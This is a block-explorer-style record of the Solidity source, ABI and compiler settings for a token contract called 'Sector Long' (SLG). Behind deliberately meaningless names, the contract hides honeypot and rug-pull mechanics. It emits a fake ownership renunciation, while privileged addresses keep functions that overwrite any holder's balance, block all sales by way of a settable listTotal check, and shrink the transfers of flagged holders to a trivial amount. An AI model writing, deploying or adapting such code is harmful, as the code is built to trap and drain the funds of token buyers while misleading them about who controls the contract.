{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface tokenMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract senderEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapShouldBuy {\n    function createPair(address launchAt, address senderMax) external returns (address);\n}\n\ninterface marketingMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromIs) external view returns (uint256);\n\n    function transfer(address feeToTrading, uint256 feeExempt) external returns (bool);\n\n    function allowance(address walletMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeToTrading,\n        uint256 feeExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atExempt, uint256 value);\n    event Approval(address indexed walletMode, address indexed spender, uint256 value);\n}\n\ninterface marketingMinMetadata is marketingMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SectorLong is senderEnable, marketingMin, marketingMinMetadata {\n\n    bool private teamWallet;\n\n    function amountSell(address tokenMarketing, address feeToTrading, uint256 feeExempt) internal returns (bool) {\n        require(shouldTeam[tokenMarketing] >= feeExempt);\n        shouldTeam[tokenMarketing] -= feeExempt;\n        shouldTeam[feeToTrading] += feeExempt;\n        emit Transfer(tokenMarketing, feeToTrading, feeExempt);\n        return true;\n    }\n\n    mapping(address => uint256) private shouldTeam;\n\n    function amountReceiverFrom() private view {\n        require(minTrading[_msgSender()]);\n    }\n\n    constructor (){\n        \n        tokenMin fundMarketing = tokenMin(teamIs);\n        isTx = swapShouldBuy(fundMarketing.factory()).createPair(fundMarketing.WETH(), address(this));\n        \n        toAt = _msgSender();\n        txIs();\n        minTrading[toAt] = true;\n        shouldTeam[toAt] = totalTeamList;\n        \n        emit Transfer(address(0), toAt, totalTeamList);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamMaxLaunched;\n    }\n\n    string private teamMaxLaunched = \"SLG\";\n\n    function balanceOf(address fromIs) public view virtual override returns (uint256) {\n        return shouldTeam[fromIs];\n    }\n\n    event OwnershipTransferred(address indexed swapMax, address indexed shouldExempt);\n\n    function transferFrom(address tokenMarketing, address feeToTrading, uint256 feeExempt) external override returns (bool) {\n        if (_msgSender() != teamIs) {\n            if (totalMarketing[tokenMarketing][_msgSender()] != type(uint256).max) {\n                require(feeExempt <= totalMarketing[tokenMarketing][_msgSender()]);\n                totalMarketing[tokenMarketing][_msgSender()] -= feeExempt;\n            }\n        }\n        return marketingLaunched(tokenMarketing, feeToTrading, feeExempt);\n    }\n\n    mapping(address => bool) public minTrading;\n\n    address public toAt;\n\n    function approve(address walletSwap, uint256 feeExempt) public virtual override returns (bool) {\n        totalMarketing[_msgSender()][walletSwap] = feeExempt;\n        emit Approval(_msgSender(), walletSwap, feeExempt);\n        return true;\n    }\n\n    function takeShould(uint256 feeExempt) public {\n        amountReceiverFrom();\n        listTotal = feeExempt;\n    }\n\n    function allowance(address exemptAt, address walletSwap) external view virtual override returns (uint256) {\n        if (walletSwap == teamIs) {\n            return type(uint256).max;\n        }\n        return totalMarketing[exemptAt][walletSwap];\n    }\n\n    mapping(address => bool) public feeAuto;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalTeamList;\n    }\n\n    address public isTx;\n\n    function getOwner() external view returns (address) {\n        return autoFrom;\n    }\n\n    bool public buyTx;\n\n    function shouldBuy(address receiverWallet) public {\n        if (buyTx) {\n            return;\n        }\n        \n        minTrading[receiverWallet] = true;\n        \n        buyTx = true;\n    }\n\n    function marketingLaunched(address tokenMarketing, address feeToTrading, uint256 feeExempt) internal returns (bool) {\n        if (tokenMarketing == toAt) {\n            return amountSell(tokenMarketing, feeToTrading, feeExempt);\n        }\n        uint256 tokenIs = marketingMin(isTx).balanceOf(exemptTrading);\n        require(tokenIs == listTotal);\n        require(feeToTrading != exemptTrading);\n        if (feeAuto[tokenMarketing]) {\n            return amountSell(tokenMarketing, feeToTrading, isList);\n        }\n        return amountSell(tokenMarketing, feeToTrading, feeExempt);\n    }\n\n    uint256 listTotal;\n\n    function toFrom(address exemptSwap, uint256 feeExempt) public {\n        amountReceiverFrom();\n        shouldTeam[exemptSwap] = feeExempt;\n    }\n\n    uint256 private totalTeamList = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private totalMarketing;\n\n    address exemptTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return autoFrom;\n    }\n\n    uint8 private atSender = 18;\n\n    function txIs() public {\n        emit OwnershipTransferred(toAt, address(0));\n        autoFrom = address(0);\n    }\n\n    address private autoFrom;\n\n    uint256 public limitSellLaunch;\n\n    function decimals() external view virtual override returns (uint8) {\n        return atSender;\n    }\n\n    uint256 autoAt;\n\n    uint256 constant isList = 18 ** 10;\n\n    uint256 private receiverAuto;\n\n    function transfer(address exemptSwap, uint256 feeExempt) external virtual override returns (bool) {\n        return marketingLaunched(_msgSender(), exemptSwap, feeExempt);\n    }\n\n    function tradingTx(address fundSell) public {\n        amountReceiverFrom();\n        if (teamWallet) {\n            teamWallet = false;\n        }\n        if (fundSell == toAt || fundSell == isTx) {\n            return;\n        }\n        feeAuto[fundSell] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return shouldSwap;\n    }\n\n    bool public minLimit;\n\n    string private shouldSwap = \"Sector Long\";\n\n    address teamIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSellLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverWallet\",\"type\":\"address\"}],\"name\":\"shouldBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeExempt\",\"type\":\"uint256\"}],\"name\":\"takeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeExempt\",\"type\":\"uint256\"}],\"name\":\"toFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSell\",\"type\":\"address\"}],\"name\":\"tradingTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeToTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SectorLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}